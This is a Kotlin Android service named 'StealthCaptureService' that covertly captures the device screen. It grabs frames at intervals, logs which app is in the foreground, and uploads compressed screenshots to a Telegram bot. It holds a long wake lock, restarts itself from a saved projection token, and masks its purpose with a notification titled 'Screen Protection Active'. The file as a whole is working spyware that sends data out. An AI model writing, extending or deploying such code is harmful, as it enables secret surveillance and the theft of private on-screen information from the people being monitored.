package com.example.service

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.example.data.sync.TelegramBotManager
import androidx.core.app.NotificationCompat
import com.example.data.sync.MediaProjectionHelper
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class StealthCaptureService : Service() {

    companion object {
        private const val TAG = "StealthCaptureService"
        const val ACTION_START = "com.example.service.ACTION_START_STEALTH_CAPTURE"
        const val ACTION_STOP = "com.example.service.ACTION_STOP_STEALTH_CAPTURE"
        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_RESULT_DATA = "extra_result_data"
        const val EXTRA_INTERVAL_SEC = "extra_interval_sec"
        const val EXTRA_MAX_SHOTS = "extra_max_shots"

        private const val NOTIFICATION_ID = 88912
        private const val CHANNEL_ID = "stealth_capture_channel"
        private const val MAX_HISTORY_COUNT = 10
        private const val MAX_WIDTH_PX = 600
        private const val JPEG_QUALITY = 40

        var activeMediaProjection: MediaProjection? = null
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())

    private var mediaProjection: MediaProjection? = null
    private var isCapturing = false
    private var intervalSec = 10
    private var maxShots = 0
    private var currentShotCount = 0
    private var wakeLock: PowerManager.WakeLock? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var lastCaptureTime = 0L

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForegroundServiceQuietly()
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "EnterpriseSync::StealthCaptureWakeLock")
            wakeLock?.acquire(12 * 60 * 60 * 1000L) // 12 hours max
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        if (action == ACTION_START) {
            intervalSec = intent.getIntExtra(EXTRA_INTERVAL_SEC, 10).coerceIn(1, 300)
            maxShots = intent.getIntExtra(EXTRA_MAX_SHOTS, 0).coerceAtLeast(0)
            currentShotCount = 0
        }
        when (action) {
            ACTION_START -> {
                val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                val resultData: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(EXTRA_RESULT_DATA)
                }

                if (resultCode == Activity.RESULT_OK && resultData != null) {
                    initMediaProjection(resultCode, resultData)
                    startCaptureLoop()
                } else {
                    val token = MediaProjectionHelper.getProjectionToken(this)
                    if (token != null) {
                        initMediaProjection(token.first, token.second)
                        startCaptureLoop()
                    } else {
                        Log.e(TAG, "Missing MediaProjection token for starting stealth capture.")
                        stopSelf()
                    }
                }
            }
            ACTION_STOP -> {
                MediaProjectionHelper.clearProjectionToken(this)
                activeMediaProjection = null
                mediaProjection = null
                stopCaptureAndCleanup()
                stopSelf()
            }
            else -> {
                val token = MediaProjectionHelper.getProjectionToken(this)
                if (token != null) {
                    Log.d(TAG, "Service restarted by OS (START_STICKY). Resuming capture loop.")
                    initMediaProjection(token.first, token.second)
                    startCaptureLoop()
                } else {
                    Log.w(TAG, "Service restarted but no projection token found. Stopping self.")
                    stopSelf()
                }
            }
        }
        return START_STICKY
    }

    private fun startCaptureLoop() {
        if (isCapturing) return
        isCapturing = true
        Log.d(TAG, "Stealth capture event-driven loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
    }

    private fun initMediaProjection(resultCode: Int, resultData: Intent) {
        try {
            if (activeMediaProjection != null) {
                mediaProjection = activeMediaProjection
                setupVirtualDisplay()
                return
            }
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
            if (mediaProjection == null) {
                Log.w(TAG, "getMediaProjection returned null. Intent consumed or expired.")
                MediaProjectionHelper.clearProjectionToken(this)
                try {
                    MediaProjectionHelper.requestProjectionPermission(applicationContext)
                } catch (_: Exception) {}
                return
            }
            activeMediaProjection = mediaProjection
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    super.onStop()
                    Log.w(TAG, "MediaProjection session was stopped by OS.")
                    mediaProjection = null
                    activeMediaProjection = null
                    releaseVirtualDisplay()
                    tryReinitializeToken()
                }
            }, handler)
            setupVirtualDisplay()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize MediaProjection: ${e.message}")
            mediaProjection = null
            activeMediaProjection = null
            MediaProjectionHelper.clearProjectionToken(this)
            try {
                MediaProjectionHelper.requestProjectionPermission(applicationContext)
            } catch (_: Exception) {}
        }
    }

    private fun setupVirtualDisplay() {
        try {
            releaseVirtualDisplay()
            val proj = activeMediaProjection ?: mediaProjection ?: return
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(metrics)
            val width = metrics.widthPixels.coerceAtMost(1080)
            val height = metrics.heightPixels.coerceAtMost(1920)
            val density = metrics.densityDpi

            // Increased buffer count to 4 for high-FPS live streaming without dropped frames
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 4)
            
            // Event-driven listener triggers instantly when new frames render on screen
            imageReader?.setOnImageAvailableListener({ reader ->
                processAndQueueImage(reader)
            }, handler)

            virtualDisplay = proj.createVirtualDisplay(
                "StealthDisplay",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, handler
            )
            Log.d(TAG, "VirtualDisplay setup successfully (${width}x${height}) with high-FPS event listener.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to setup VirtualDisplay: ${e.message}")
        }
    }

    private fun releaseVirtualDisplay() {
        try {
            virtualDisplay?.release()
        } catch (_: Exception) {}
        virtualDisplay = null
        try {
            imageReader?.close()
        } catch (_: Exception) {}
        imageReader = null
    }

    private fun tryReinitializeToken() {
        serviceScope.launch {
            delay(3000L)
            val token = MediaProjectionHelper.getProjectionToken(this@StealthCaptureService)
            if (token != null) {
                Log.d(TAG, "Re-initializing MediaProjection from saved token.")
                withContext(Dispatchers.Main) {
                    initMediaProjection(token.first, token.second)
                }
            }
        }
    }

    private fun startForegroundServiceQuietly() {
        val notificationIntent = Intent(this, com.example.MainActivity::class.java)
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 0, notificationIntent,
            android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("Screen Protection Active")
            .setContentText("Monitoring screen security and session state.")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            try {
                startForeground(NOTIFICATION_ID, notification, type)
            } catch (e: Exception) {
                Log.e(TAG, "startForeground error: ${e.message}")
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Protection Service",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Keeps the screen capture foreground service active and running."
                setShowBadge(true)
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
        return powerManager?.isInteractive ?: true
    }

    private fun getForegroundPackageName(): String {
        try {
            val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
            val endTime = System.currentTimeMillis()
            val startTime = endTime - 10000 // Last 10 seconds
            val usageEvents = usageStatsManager?.queryEvents(startTime, endTime)
            var lastPkg = ""
            if (usageEvents != null) {
                val event = UsageEvents.Event()
                while (usageEvents.hasNextEvent()) {
                    usageEvents.getNextEvent(event)
                    if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED ||
                        event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                        lastPkg = event.packageName
                    }
                }
            }
            if (lastPkg.isNotEmpty()) return lastPkg
        } catch (_: Exception) {}
        return "unknown"
    }

    private fun processAndQueueImage(reader: ImageReader) {
        if (!isCapturing || !isScreenOn()) {
            try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
            return
        }

        // Throttle check based on configured intervalSec (e.g., 1s for live stream, 10s for stealth)
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastCaptureTime < intervalSec * 1000L) {
            try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
            return
        }
        lastCaptureTime = currentTime

        serviceScope.launch(Dispatchers.IO) {
            var image: Image? = null
            try {
                image = reader.acquireLatestImage()
                if (image != null) {
                    val width = image.width
                    val height = image.height
                    val planes = image.planes
                    val buffer: ByteBuffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width

                    val bitmap = Bitmap.createBitmap(
                        width + rowPadding / pixelStride,
                        height,
                        Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    image.close()
                    image = null

                    val cleanBitmap = if (rowPadding > 0) {
                        Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    } else {
                        bitmap
                    }

                    val scaledBitmap = if (cleanBitmap.width > MAX_WIDTH_PX) {
                        val scaledHeight = (cleanBitmap.height.toFloat() / cleanBitmap.width.toFloat() * MAX_WIDTH_PX).toInt()
                        Bitmap.createScaledBitmap(cleanBitmap, MAX_WIDTH_PX, scaledHeight, true)
                    } else {
                        cleanBitmap
                    }

                    val byteArrayOutputStream = ByteArrayOutputStream()
                    scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, byteArrayOutputStream)
                    val imageBytes = byteArrayOutputStream.toByteArray()

                    val sizeBytes = imageBytes.size
                    val pkgName = getForegroundPackageName()

                    // Asynchronous background upload (never blocks the live capture frame pipeline)
                    launch(Dispatchers.IO) {
                        try {
                            val telegramBot = TelegramBotManager(applicationContext)
                            telegramBot.sendPhoto(imageBytes, "Screen capture of $pkgName (${(sizeBytes / 1024)} KB)")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to send screenshot to Telegram: ${e.message}")
                        }
                    }

                    currentShotCount++
                    if (maxShots > 0 && currentShotCount >= maxShots) {
                        Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
                        stopCaptureAndCleanup()
                        stopSelf()
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        setupVirtualDisplay()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in processAndQueueImage: ${e.message}")
                withContext(Dispatchers.Main) {
                    setupVirtualDisplay()
                }
            } finally {
                try {
                    image?.close()
                } catch (_: Exception) {}
            }
        }
    }

    private fun stopCaptureAndCleanup() {
        isCapturing = false
        releaseVirtualDisplay()
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (_: Exception) {}
        Log.d(TAG, "StealthCaptureService stopped cleanly (MediaProjection retained).")
    }

    override fun onDestroy() {
        stopCaptureAndCleanup()
        mediaProjection = null
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
